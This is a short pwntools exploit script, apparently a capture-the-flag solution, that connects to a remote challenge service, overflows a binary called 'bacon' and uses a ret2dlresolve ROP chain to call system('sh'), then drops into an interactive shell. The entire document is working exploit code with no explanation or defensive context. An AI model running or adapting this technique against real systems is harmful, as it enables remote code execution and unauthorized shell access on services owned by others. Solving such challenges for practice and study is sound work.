//credit to circleous
from pwn import *
r = remote("jh2i.com", 50032)
elf = ELF("./bacon", 0)
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["sh"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
r.send(fit({0x40C: raw_rop, 0x42C: dlresolve.payload}))
r.interactive()
